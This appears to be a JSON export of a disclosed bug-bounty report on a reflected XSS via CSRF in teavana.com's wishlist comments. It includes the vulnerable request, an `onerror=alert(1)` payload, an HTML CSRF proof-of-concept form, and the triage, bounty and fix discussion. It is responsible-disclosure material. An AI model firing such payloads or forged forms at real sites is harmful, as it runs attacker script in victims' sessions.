@@ -1,0 +1,644 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-02-09T10:11:49.783Z", 
+    "voters": [
+        "nirvana-msu", 
+        "tripwire", 
+        "spam404", 
+        "hunter", 
+        "jon_bottarini", 
+        "eveeez", 
+        "mpz", 
+        "babayaga_", 
+        "sup3r-b0y", 
+        "smit", 
+        "and 11 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "375.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 177508, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-02-13T22:48:34.625Z", 
+    "vulnerability_information": "User can add comments on their wishlist item. The http request which adds comment on wishlist item, looks like:\n\n```http\nPOST /on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/my-wishlist\nContent-Length: 55\nCookie: REDACTED\nConnection: close\n\nwishlistComment=:comment_string\n```\nThe value of the `wishlistComment` reflects on the returned HTML snippet as bellow:\n\n```html\n<textarea maxlength=\"150\" onkeyup=\"return ismaxlength(this);\" id=\"wishlistComment\" name=\"wishlistComment\" cols=\"60\" rows=\"12\">\n:comment_string\n</textarea>\n```\n\nBut the returned string is not sanitized. As a result if user submits html/javascript payload as the value, that payload will return and will cause javascript execution.\n\n**vulnerable post**\n```http\nPOST /on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id HTTP/1.1\nHost: www.teavana.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.teavana.com/us/en/my-wishlist\nContent-Length: 55\nCookie: REDACTED\nConnection: close\n\nwishlistComment=</textarea><img+src=x+onerror=alert(1)>\n```\n**Response**\n```html\n<textarea maxlength=\"150\" onkeyup=\"return ismaxlength(this);\" id=\"wishlistComment\" name=\"wishlistComment\" cols=\"60\" rows=\"12\">\n</textarea><img src=x onerror=alert(1)>\n</textarea>\n```\n\nThere is no csrf token tied with the comment adding post request. As a result this csrf flaw can make the self-xss as a global reflected xss.\n\n**CSRF to XSS PoC**\n\n```html\n<html>\n  <body>\n    <form action=\"https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id\" method=\"POST\">\n      <input type=\"hidden\" name=\"wishlistComment\" value=\"&lt;&#47;textarea&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n```\n\nReplace the `:id` with your wishlist id (ex: C1005285074). This will execute the javascript and will popup an alert box.\n\n{F129593}", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "medium", 
+        "author_type": "Team"
+    }, 
+    "title": "Reflected XSS by exploiting CSRF vulnerability on teavana.com wishlist comment module. (wishlist-comments)", 
+    "is_member_of_team?": null, 
+    "vote_count": 21, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-03-11T10:11:49.821Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$375", 
+    "attachments": [
+        {
+            "file_name": "xssed.png", 
+            "type": "image/png", 
+            "id": 129593, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/129/593/16ee0d3eb0e307e56f9ac3c91db6a3fe210261f1/xssed.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224336Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b0f8173ba6df1a2244185103c54ba0585a889d8ed9256848457993ad1f4fde19"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "original_report_id": 174986, 
+            "automated_response": false, 
+            "created_at": "2016-10-24T22:07:48.784Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-24T22:07:48.784Z", 
+            "actor": {
+                "username": "sharpie", 
+                "url": "/sharpie", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/093/272/5e963d053e113a1f5bf7922140c25f7c3e3091ce_medium.png?1474323037"
+                }, 
+                "hackerone_triager": true
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Hey @faisalahmed \n\nThank you for your submission. However, this has been previously reported to us by another researcher. We appreciate all your efforts and we hope to receive more reports from you in the future.\n\nThanks! ", 
+            "markdown_message": "<p>Hey <a href=\"/faisalahmed\">@faisalahmed</a> </p>\n\n<p>Thank you for your submission. However, this has been previously reported to us by another researcher. We appreciate all your efforts and we hope to receive more reports from you in the future.</p>\n\n<p>Thanks! </p>\n", 
+            "type": "Activities::BugDuplicate", 
+            "id": 1265497, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-24T22:09:44.990Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-24T22:10:19.265Z", 
+            "actor": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/726/d5a31dfa41936fc08a3a3c8921c6166f2cf8b57c_medium.png?1516844367"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "There are two XSS in wishlist comment module. One is a stored xss, triggers when user tries to edit the comment and another is the reflected xss triggers when user exploits the existing csrf vulnerability and post payload.\n\nAre you sure they are same?", 
+            "markdown_message": "<p>There are two XSS in wishlist comment module. One is a stored xss, triggers when user tries to edit the comment and another is the reflected xss triggers when user exploits the existing csrf vulnerability and post payload.</p>\n\n<p>Are you sure they are same?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1265498, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-24T23:48:32.401Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-24T23:48:32.401Z", 
+            "actor": {
+                "username": "sharpie", 
+                "url": "/sharpie", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/093/272/5e963d053e113a1f5bf7922140c25f7c3e3091ce_medium.png?1474323037"
+                }, 
+                "hackerone_triager": true
+            }, 
+            "additional_data": {
+                "new_title": "Reflected XSS by exploiting CSRF vulnerability on teavana.com wishlist comment module. (wishlist-comments)", 
+                "old_title": "Reflected XSS by exploiting CSRF vulnerability on teavana.com wishlist comment module."
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportTitleUpdated", 
+            "id": 1265672, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-24T23:50:07.859Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-24T23:50:07.859Z", 
+            "actor": {
+                "username": "sharpie", 
+                "url": "/sharpie", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/093/272/5e963d053e113a1f5bf7922140c25f7c3e3091ce_medium.png?1474323037"
+                }, 
+                "hackerone_triager": true
+            }, 
+            "team_handle": "starbucks", 
+            "message": "@faisalahmed  You may be right.. We'll investigate this and come back with an answer soon. Thanks for following up! ", 
+            "markdown_message": "<p><a href=\"/faisalahmed\">@faisalahmed</a>  You may be right.. We&#39;ll investigate this and come back with an answer soon. Thanks for following up! </p>\n", 
+            "type": "Activities::BugReopened", 
+            "id": 1265673, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-25T19:14:47.765Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-25T19:14:47.765Z", 
+            "actor": {
+                "username": "sharpie", 
+                "url": "/sharpie", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/093/272/5e963d053e113a1f5bf7922140c25f7c3e3091ce_medium.png?1474323037"
+                }, 
+                "hackerone_triager": true
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Hey @faisalahmed \n\nI'm having a hard time reproducing this issue using your CSRF POC. I have replaced `id` with `C146867XXXX`(my ID) and when I click on submit to try your POC, I get sent to `https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C146867XXXX` and no `alert(1)` is popped up. Any ideas? ", 
+            "markdown_message": "<p>Hey <a href=\"/faisalahmed\">@faisalahmed</a> </p>\n\n<p>I&#39;m having a hard time reproducing this issue using your CSRF POC. I have replaced <code>id</code> with <code>C146867XXXX</code>(my ID) and when I click on submit to try your POC, I get sent to <code>https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C146867XXXX</code> and no <code>alert(1)</code> is popped up. Any ideas? </p>\n", 
+            "type": "Activities::BugNeedsMoreInfo", 
+            "id": 1267188, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-25T19:25:28.006Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-25T19:25:42.626Z", 
+            "actor": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/726/d5a31dfa41936fc08a3a3c8921c6166f2cf8b57c_medium.png?1516844367"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "1. add an item to the wish list.\n2. go to https://www.teavana.com/us/en/my-wishlist\n3. Click **ADD COMMENTS** on that wish-listed product.\n4. add `</textarea><img src=x onerror=alert(1)>` as comment and save.\n5. it will say, **Your comment is saved**\n6. Now, click on **Edit Comments**\n7. XSS will be executed!", 
+            "markdown_message": "<ol>\n<li>add an item to the wish list.</li>\n<li>go to <a title=\"https://www.teavana.com/us/en/my-wishlist\" href=\"/redirect?signature=0362b6c220d4fad155a50334d8dd5ba588b3213c&amp;url=https%3A%2F%2Fwww.teavana.com%2Fus%2Fen%2Fmy-wishlist\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.teavana.com/us/en/my-wishlist</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>Click <strong>ADD COMMENTS</strong> on that wish-listed product.</li>\n<li>add <code>&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;</code> as comment and save.</li>\n<li>it will say, <strong>Your comment is saved</strong>\n</li>\n<li>Now, click on <strong>Edit Comments</strong>\n</li>\n<li>XSS will be executed!</li>\n</ol>\n", 
+            "type": "Activities::BugNew", 
+            "id": 1267216, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-25T20:59:15.677Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-25T21:08:50.847Z", 
+            "actor": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/726/d5a31dfa41936fc08a3a3c8921c6166f2cf8b57c_medium.png?1516844367"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Regarding the comment id, it changes every time. But the value of the comment id is incremental.\n\nSteps to reproduce:\n1. Go to your wishlist.\n2. Click on edit comment.\n3. Submit a new comment and intercept this request.\n4. You will find your present comment id in the intercepted URL of step 3.\n5. Use the comment id obtainted from step 4 in CSRF PoC\n6. If the payload is correct, xss should be triggered.\n", 
+            "markdown_message": "<p>Regarding the comment id, it changes every time. But the value of the comment id is incremental.</p>\n\n<p>Steps to reproduce:</p>\n\n<ol>\n<li>Go to your wishlist.</li>\n<li>Click on edit comment.</li>\n<li>Submit a new comment and intercept this request.</li>\n<li>You will find your present comment id in the intercepted URL of step 3.</li>\n<li>Use the comment id obtainted from step 4 in CSRF PoC</li>\n<li>If the payload is correct, xss should be triggered.</li>\n</ol>\n", 
+            "type": "Activities::Comment", 
+            "id": 1267488, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-25T21:11:55.266Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-25T21:11:55.266Z", 
+            "actor": {
+                "username": "sharpie", 
+                "url": "/sharpie", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/093/272/5e963d053e113a1f5bf7922140c25f7c3e3091ce_medium.png?1474323037"
+                }, 
+                "hackerone_triager": true
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Thank you for your quick reply @faisalahmed. We are currently reviewing this report. We'll update you soon! ", 
+            "markdown_message": "<p>Thank you for your quick reply <a href=\"/faisalahmed\">@faisalahmed</a>. We are currently reviewing this report. We&#39;ll update you soon! </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1267529, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-28T23:24:30.787Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-28T23:24:30.787Z", 
+            "actor": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/726/d5a31dfa41936fc08a3a3c8921c6166f2cf8b57c_medium.png?1516844367"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Anything on this one?", 
+            "markdown_message": "<p>Anything on this one?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1273676, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-28T23:28:10.538Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-28T23:28:10.538Z", 
+            "actor": {
+                "username": "sharpie", 
+                "url": "/sharpie", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/093/272/5e963d053e113a1f5bf7922140c25f7c3e3091ce_medium.png?1474323037"
+                }, 
+                "hackerone_triager": true
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Hey @faisalahmed \n\nThank you for the follow up comment. As we mentioned in the last comment, we'll notify you once there's an update. Thanks! ", 
+            "markdown_message": "<p>Hey <a href=\"/faisalahmed\">@faisalahmed</a> </p>\n\n<p>Thank you for the follow up comment. As we mentioned in the last comment, we&#39;ll notify you once there&#39;s an update. Thanks! </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1273681, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-09T20:18:00.173Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-09T20:18:00.173Z", 
+            "actor": {
+                "username": "coldbr3w", 
+                "url": "/coldbr3w", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/109/209/c72818e5675f46b56e77d12bcd50678215ea0750_medium.png?1474666718"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 1292089, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-09T20:33:10.824Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-09T20:33:10.824Z", 
+            "actor": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/726/d5a31dfa41936fc08a3a3c8921c6166f2cf8b57c_medium.png?1516844367"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Thanks a lot for triaging this one, was eagerly waiting for an update of this.", 
+            "markdown_message": "<p>Thanks a lot for triaging this one, was eagerly waiting for an update of this.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1292128, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-15T17:44:36.269Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-15T17:44:36.269Z", 
+            "actor": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/726/d5a31dfa41936fc08a3a3c8921c6166f2cf8b57c_medium.png?1516844367"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Any bounty decision on this one?", 
+            "markdown_message": "<p>Any bounty decision on this one?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1300759, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2016-11-15T21:43:06.323Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-15T21:43:06.323Z", 
+            "actor": {
+                "url": "/starbucks", 
+                "profile": {
+                    "name": "Starbucks"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/989/48053f0ef688949bbb28248c5fc6ebb4f389820d_medium.?1432930626"
+                }
+            }, 
+            "team_handle": "starbucks", 
+            "bounty_amount": "150.0", 
+            "collaborator": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed"
+            }, 
+            "message": "@faisalahmed \n\nThank you for your submission. We are working on a fix and will contact you when it is time for a re-test.", 
+            "markdown_message": "<p><a href=\"/faisalahmed\">@faisalahmed</a> </p>\n\n<p>Thank you for your submission. We are working on a fix and will contact you when it is time for a re-test.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1301178, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-11-15T21:52:47.770Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-15T21:52:47.770Z", 
+            "actor": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/726/d5a31dfa41936fc08a3a3c8921c6166f2cf8b57c_medium.png?1516844367"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "This is really a pathetic turnout for an xss issue. You have rewarded a csrf on the same endpoint with 375$ and rewarded the xss with 150$. Whereas, the xss itself is working as the csrf bypass, cause whenever the payload is used the payload is getting saved on the victims account. And how come a CSRF is more severe than the XSS? Please clarify.\n\nThis is not acceptable at all.", 
+            "markdown_message": "<p>This is really a pathetic turnout for an xss issue. You have rewarded a csrf on the same endpoint with 375$ and rewarded the xss with 150$. Whereas, the xss itself is working as the csrf bypass, cause whenever the payload is used the payload is getting saved on the victims account. And how come a CSRF is more severe than the XSS? Please clarify.</p>\n\n<p>This is not acceptable at all.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1301198, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-01-18T00:42:33.413Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-18T00:42:33.413Z", 
+            "actor": {
+                "url": "/starbucks", 
+                "profile": {
+                    "name": "Starbucks"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/989/48053f0ef688949bbb28248c5fc6ebb4f389820d_medium.?1432930626"
+                }
+            }, 
+            "team_handle": "starbucks", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "225.0", 
+            "collaborator": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed"
+            }, 
+            "message": "Hi @faisalahmed,\n\nThis is @coldbr3w, I'd like to apologize for the mix up in classifying this bug. This issue should not have received such a low rating and bounty reward. After consulting with the team, we have decided to increase the bounty amount to a total of $375. We're also happy to share that the issue has been resolved since the wish list functionality has been deprecated. Please confirm that that XSS is no longer possible after saving an item to wishlist. The feature should have been removed from `teavana.com`.\n\nThank you for you patience and understanding.", 
+            "markdown_message": "<p>Hi <a href=\"/faisalahmed\">@faisalahmed</a>,</p>\n\n<p>This is <a href=\"/coldbr3w\">@coldbr3w</a>, I&#39;d like to apologize for the mix up in classifying this bug. This issue should not have received such a low rating and bounty reward. After consulting with the team, we have decided to increase the bounty amount to a total of $375. We&#39;re also happy to share that the issue has been resolved since the wish list functionality has been deprecated. Please confirm that that XSS is no longer possible after saving an item to wishlist. The feature should have been removed from <code>teavana.com</code>.</p>\n\n<p>Thank you for you patience and understanding.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1426399, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-18T00:42:46.485Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-18T00:42:46.485Z", 
+            "actor": {
+                "username": "coldbr3w", 
+                "url": "/coldbr3w", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/109/209/c72818e5675f46b56e77d12bcd50678215ea0750_medium.png?1474666718"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Medium", 
+                "old_severity": null
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1426400, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed"
+            }, 
+            "created_at": "2017-01-18T00:42:52.134Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-18T00:42:52.134Z", 
+            "actor": {
+                "username": "coldbr3w", 
+                "url": "/coldbr3w", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/109/209/c72818e5675f46b56e77d12bcd50678215ea0750_medium.png?1474666718"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 1426401, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-18T00:59:19.579Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-18T01:01:00.019Z", 
+            "actor": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/726/d5a31dfa41936fc08a3a3c8921c6166f2cf8b57c_medium.png?1516844367"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "Hi @coldbr3w,\nI'm confirming the issue no longer reproduces for me.\nAnd the additional bounty is very much appreciated!\nThank you for running an amazing, transparent; yet professionally managed bounty program.", 
+            "markdown_message": "<p>Hi <a href=\"/coldbr3w\">@coldbr3w</a>,<br>\nI&#39;m confirming the issue no longer reproduces for me.<br>\nAnd the additional bounty is very much appreciated!<br>\nThank you for running an amazing, transparent; yet professionally managed bounty program.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1426423, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-09T10:11:49.799Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-09T10:11:49.799Z", 
+            "actor": {
+                "username": "faisalahmed", 
+                "url": "/faisalahmed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/726/d5a31dfa41936fc08a3a3c8921c6166f2cf8b57c_medium.png?1516844367"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1474023, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-13T22:48:34.641Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-13T22:48:34.641Z", 
+            "actor": {
+                "username": "siren", 
+                "url": "/siren", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1483681, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-13T22:48:34.678Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-13T22:48:34.678Z", 
+            "actor": {
+                "username": "siren", 
+                "url": "/siren", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "starbucks", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1483682, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "faisalahmed", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/faisalahmed", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/003/726/22a27e974741554e34a7aaa31c90ecde9581d2bf_small.png?1516844367"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 60, 
+        "name": "Cross-site Scripting (XSS) - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -54909106.72647866, 
+    "disclosed_at": "2017-02-13T22:48:34.665Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/177508", 
+    "created_at": "2016-10-22T10:40:41.332Z", 
+    "original_report_url": null, 
